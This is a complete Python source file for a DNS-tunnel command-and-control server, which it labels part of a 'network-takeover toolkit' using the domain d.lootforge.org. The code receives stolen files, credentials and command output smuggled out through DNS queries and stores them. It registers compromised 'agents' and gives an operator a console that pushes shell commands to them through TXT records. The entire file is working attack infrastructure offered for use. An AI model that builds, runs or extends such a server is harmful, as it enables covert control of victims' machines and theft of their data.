#!/usr/bin/env python3
# v1.0
"""
c2_server.py — DNS tunnel C2 server for the network-takeover toolkit.

Authoritative nameserver for d.lootforge.org.  Receives exfiltrated data
from dns_c2.py (client side in main.py --remote mode) and delivers operator
commands as TXT record responses.

Setup:
  - Run with root privileges (requires UDP/53).
  - Open UDP/53 inbound on the host firewall.
  - lootforge.org NS delegation must point d.lootforge.org to this server's IP.
    (NS glue: cwmkeg.lootforge.org → this machine)
  - pip install scapy

Wire protocol (handled automatically — no manual configuration required):

  Handshake (client → server on startup):
    hello.<agent_id>.<domain>   A query    → server registers agent, replies A
    status.<agent_id>.<domain>  TXT query  → server replies "ACK" if registered

  Command delivery (client polls every 60 s):
    command.<domain>            TXT query  → server replies b32(cmd) or "NONE"

  Data exfiltration (files, creds, command output):
    <b32chunk>.<seq>.<total>.<sid>.<domain>  A query
    Reassembled chunks are decoded from base32.
    Payloads prefixed FILE:<name>: are saved to received_files/<name>.
    All other payloads are appended to received.log.

Operator console commands:
  bash <cmd>   Queue a shell command for all agents (delivered at next poll)
  clear        Cancel the pending command
  agents       List registered agents and their last-seen time
  files        List files received in this session
  q / exit     Stop the server
"""

import base64
import datetime
import os
import socket
import sys
import threading
import time

from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send, sniff, conf
from scapy.layers.dns import DNSRRSOA

VERSION      = "v1.0"
DOMAIN       = "d.lootforge.org"
NS_HOST      = "cwmkeg.lootforge.org"
RECEIVED_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "received_files")
RECEIVED_LOG = os.path.join(os.path.dirname(os.path.abspath(__file__)), "received.log")

os.makedirs(RECEIVED_DIR, exist_ok=True)
conf.verb = 0


# ── Shared state ──────────────────────────────────────────────────────────────

_state_lock = threading.Lock()
_state      = {"command": "NONE"}

_session_lock = threading.Lock()
_sessions     = {}   # sid -> {"chunks": {idx: str}, "total": int}

_agents_lock = threading.Lock()
_agents      = {}    # agent_id -> {"first_seen": float, "last_seen": float, "ip": str}

_files_lock  = threading.Lock()
_received_files = []  # list of filenames saved this session


# ── Encoding ──────────────────────────────────────────────────────────────────

def _b32dec(s: str) -> bytes:
    s = s.upper()
    return base64.b32decode(s + "=" * ((8 - len(s) % 8) % 8))


def _b32enc(s: str) -> bytes:
    return base64.b32encode(s.encode("utf-8"))


# ── Output ────────────────────────────────────────────────────────────────────

def _notify(msg: str) -> None:
    print(f"\n{'=' * 60}")
    print(msg)
    print("=" * 60)
    print(">>> ", end="", flush=True)


def _save_payload(session_id: str, raw: bytes) -> None:
    """Dispatch a fully reassembled payload to the right destination.

    Payloads from exfiltrate_file() carry a FILE:<basename>: prefix.
    Everything else (credentials, command output, plain text) goes to received.log.
    """
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if raw.startswith(b"FILE:"):
        # Format: FILE:<basename>:<binary_content>
        rest = raw[5:]  # strip leading "FILE:"
        sep = rest.find(b":")
        if sep != -1:
            filename = rest[:sep].decode("utf-8", errors="replace")
            content  = rest[sep + 1:]
        else:
            filename = f"file_{session_id}.bin"
            content  = rest

        # Sanitise filename to prevent path traversal
        filename = os.path.basename(filename) or f"file_{session_id}.bin"
        filepath = os.path.join(RECEIVED_DIR, filename)
        base, ext = os.path.splitext(filename)
        counter = 1
        while os.path.exists(filepath):
            filepath = os.path.join(RECEIVED_DIR, f"{base}_{counter}{ext}")
            counter += 1

        with open(filepath, "wb") as fh:
            fh.write(content)

        with _files_lock:
            _received_files.append(os.path.basename(filepath))

        _notify(
            f"  FILE RECEIVED\n"
            f"  Session  : {session_id}\n"
            f"  Time     : {ts}\n"
            f"  Saved as : {filepath}\n"
            f"  Size     : {len(content)} B"
        )
    else:
        # Plain text — credentials, command output, arbitrary data
        try:
            text = raw.decode("utf-8")
        except Exception:
            text = f"[binary] {raw.hex()}"

        with open(RECEIVED_LOG, "a", encoding="utf-8") as fh:
            fh.write(f"[{ts}] [{session_id}] {text}\n")

        _notify(
            f"  DATA RECEIVED\n"
            f"  Session  : {session_id}\n"
            f"  Time     : {ts}\n"
            f"  Payload  : {text[:300]}{'...' if len(text) > 300 else ''}"
        )


# ── DNS response builders ─────────────────────────────────────────────────────

def _soa_rr(rrname: bytes) -> DNSRRSOA:
    serial = int(datetime.datetime.now().strftime("%Y%m%d%H"))
    return DNSRRSOA(
        rrname=rrname, ttl=0,
        mname=(NS_HOST + ".").encode(),
        rname=("hostmaster." + DOMAIN + ".").encode(),
        serial=serial, refresh=3600, retry=900, expire=604800, minimum=0,
    )


def _opt_rr() -> DNSRR:
    return DNSRR(rrname=b".", type=41, rclass=4096, ttl=0, rdata=b"")


def _wrap(req, dns_layer):
    return (
        IP(dst=req[IP].src, src=req[IP].dst)
        / UDP(dport=req[UDP].sport, sport=53)
        / dns_layer
    )


def _make_soa_response(req):
    zone = (DOMAIN + ".").encode()
    return _wrap(req, DNS(id=req[DNS].id, qr=1, aa=1, rd=0,
                          qd=req[DNS].qd, an=_soa_rr(zone), ar=_opt_rr()))


def _make_ns_response(req):
    zone = (DOMAIN + ".").encode()
    return _wrap(req, DNS(id=req[DNS].id, qr=1, aa=1, rd=0,
                          qd=req[DNS].qd,
                          an=DNSRR(rrname=zone, type="NS", ttl=0,
                                   rdata=(NS_HOST + ".").encode()),
                          ar=_opt_rr()))


def _make_a_response(req):
    return _wrap(req, DNS(id=req[DNS].id, qr=1, aa=1, rd=0,
                          qd=req[DNS].qd,
                          an=DNSRR(rrname=req[DNS].qd.qname, type="A",
                                   ttl=0, rdata=req[IP].dst),
                          ar=_opt_rr()))


def _make_txt_response(req, txt: bytes):
    return _wrap(req, DNS(id=req[DNS].id, qr=1, aa=1, rd=0,
                          qd=req[DNS].qd,
                          an=DNSRR(rrname=req[DNS].qd.qname, type="TXT",
                                   ttl=0, rdata=txt),
                          ar=_opt_rr()))


def _make_nxdomain_response(req):
    zone = (DOMAIN + ".").encode()
    return _wrap(req, DNS(id=req[DNS].id, qr=1, aa=1, rd=0, rcode=3,
                          qd=req[DNS].qd, ns=_soa_rr(zone), ar=_opt_rr()))


# ── Reassembly ────────────────────────────────────────────────────────────────

def _handle_data_query(sub_labels: list, src_ip: str) -> bool:
    """Accumulate base32 chunks from an exfiltration query stream.

    Expected sub-label format: [<b32chunk>, <seq>, <total>, <session_id>]
    Returns True if the format matched (reassembly may still be in progress).
    """
    if len(sub_labels) < 4:
        return False
    session_id = sub_labels[-1]
    try:
        total   = int(sub_labels[-2])
        idx     = int(sub_labels[-3])
        raw_b32 = sub_labels[-4]
    except (ValueError, IndexError):
        return False

    with _session_lock:
        if session_id not in _sessions:
            _sessions[session_id] = {"chunks": {}, "total": total}
            print(f"\n[+] New session {session_id} from {src_ip} ({total} chunk(s) expected)")
        _sessions[session_id]["chunks"][idx] = raw_b32
        received = len(_sessions[session_id]["chunks"])

        if received == total:
            full_b32 = "".join(_sessions[session_id]["chunks"][i] for i in range(total))
            del _sessions[session_id]
            try:
                assembled = _b32dec(full_b32)
            except Exception as exc:
                print(f"\n[!] Decode error (session={session_id}): {exc}")
                return True
            threading.Thread(
                target=_save_payload, args=(session_id, assembled), daemon=True
            ).start()
        else:
            print(f"[~] Session {session_id}: {received}/{total} chunks")

    return True


# ── Packet handler ────────────────────────────────────────────────────────────

_DOMAIN_LABELS = DOMAIN.split(".")
_DOMAIN_LEN    = len(_DOMAIN_LABELS)


def _dns_handler(pkt) -> None:
    if not (pkt.haslayer(IP) and pkt.haslayer(UDP) and pkt.haslayer(DNS)):
        return
    dns = pkt[DNS]
    if dns.qr != 0 or dns.qdcount == 0:
        return

    qname = dns.qd.qname.decode("utf-8", errors="ignore").rstrip(".").lower()
    qtype = dns.qd.qtype

    if qname != DOMAIN and not qname.endswith("." + DOMAIN):
        return

    labels     = qname.split(".")
    sub_labels = labels[:-_DOMAIN_LEN]
    src_ip     = pkt[IP].src

    print(f"[DNS] {src_ip} → {qname}  (type={qtype})")

    # Zone apex
    if not sub_labels:
        send(_make_ns_response(pkt) if qtype == 2 else _make_soa_response(pkt), verbose=0)
        return

    # Command poll: command.<domain>
    if sub_labels == ["command"]:
        with _state_lock:
            cmd = _state["command"]
        txt = b"NONE" if cmd == "NONE" else _b32enc(cmd)
        print(f"[CMD] Responding: {txt.decode()[:60]}")
        send(_make_txt_response(pkt, txt), verbose=0)
        return

    # Handshake hello: hello.<agent_id>.<domain>
    if len(sub_labels) == 2 and sub_labels[0] == "hello":
        agent_id = sub_labels[1]
        now = time.time()
        with _agents_lock:
            if agent_id not in _agents:
                _agents[agent_id] = {"first_seen": now, "last_seen": now, "ip": src_ip}
                _notify(
                    f"  NEW AGENT REGISTERED\n"
                    f"  ID   : {agent_id}\n"
                    f"  IP   : {src_ip}\n"
                    f"  Time : {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                )
            else:
                _agents[agent_id]["last_seen"] = now
                _agents[agent_id]["ip"] = src_ip
                print(f"[HB]  Agent {agent_id} heartbeat from {src_ip}")
        send(_make_a_response(pkt), verbose=0)
        return

    # Handshake status: status.<agent_id>.<domain>
    if len(sub_labels) == 2 and sub_labels[0] == "status":
        agent_id = sub_labels[1]
        with _agents_lock:
            known = agent_id in _agents
        txt = b"ACK" if known else b"NONE"
        print(f"[HS]  Status agent={agent_id} → {txt.decode()}")
        send(_make_txt_response(pkt, txt), verbose=0)
        return

    # Data exfiltration chunks
    if _handle_data_query(sub_labels, src_ip):
        send(_make_a_response(pkt), verbose=0)
        return

    # Unknown subdomain
    print(f"[?]  Unknown subdomain → NXDOMAIN")
    send(_make_nxdomain_response(pkt), verbose=0)


# ── Operator console ──────────────────────────────────────────────────────────

def _console_loop() -> None:
    print("\n[*] Operator console ready.")
    print("    bash <cmd>   Queue a shell command for agents")
    print("    clear        Cancel pending command")
    print("    agents       List registered agents")
    print("    files        List received files this session")
    print("    q / exit     Stop server\n")

    while True:
        try:
            print(">>> ", end="", flush=True)
            line = input().strip()
        except (EOFError, KeyboardInterrupt):
            return

        if not line:
            continue

        lc = line.lower()

        if lc == "clear":
            with _state_lock:
                _state["command"] = "NONE"
            print("[*] Command cleared.")

        elif lc in ("agents", "list"):
            with _agents_lock:
                if not _agents:
                    print("[*] No agents registered yet.")
                else:
                    print(f"[*] {len(_agents)} agent(s):")
                    now = time.time()
                    for aid, info in sorted(_agents.items(),
                                            key=lambda x: x[1]["last_seen"],
                                            reverse=True):
                        age   = int(now - info["last_seen"])
                        first = datetime.datetime.fromtimestamp(
                            info["first_seen"]).strftime("%H:%M:%S")
                        print(f"    {aid:<12s}  ip={info['ip']:<16s}"
                              f"  first={first}  last={age}s ago")

        elif lc == "files":
            with _files_lock:
                if not _received_files:
                    print(f"[*] No files received yet  ({RECEIVED_DIR})")
                else:
                    print(f"[*] {len(_received_files)} file(s) received ({RECEIVED_DIR}):")
                    for fname in _received_files:
                        fpath = os.path.join(RECEIVED_DIR, fname)
                        size  = os.path.getsize(fpath) if os.path.exists(fpath) else 0
                        print(f"    {fname:<45s}  {size:>9d} B")

        elif lc in ("q", "exit", "quit"):
            print("[*] Server stopping.")
            os._exit(0)

        else:
            with _state_lock:
                _state["command"] = line
            print(f"[*] Command queued  : '{line}'")
            print(f"    Encoded (b32)   : {_b32enc(line).decode()}")


# ── Entry point ───────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print("=" * 60)
    print(f"  DNS C2 Server ({VERSION})")
    print(f"  Zone         : {DOMAIN}")
    print(f"  NS hostname  : {NS_HOST}")
    print(f"  Received log : {RECEIVED_LOG}")
    print(f"  Received dir : {RECEIVED_DIR}")
    print(f"  Listening    : UDP/53 (all interfaces)")
    print("=" * 60)

    threading.Thread(target=_console_loop, daemon=True).start()

    # Bind a sink socket on UDP/53 so the kernel does not fire ICMP
    # port-unreachable for packets that Scapy processes via raw sniff.
    _sink = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    _sink.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        _sink.bind(("0.0.0.0", 53))
        print("[*] ICMP suppression active (sink socket on UDP/53)")
    except OSError as exc:
        print(f"[!] Could not bind sink socket (ICMP suppression disabled): {exc}")

    print("[*] Sniffing for DNS queries on UDP/53…  (Ctrl+C or 'q' to stop)\n")
    try:
        sniff(filter="udp port 53", prn=_dns_handler, store=0)
    except PermissionError:
        print("[!] Permission denied — run as root.")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[*] Server stopped.")
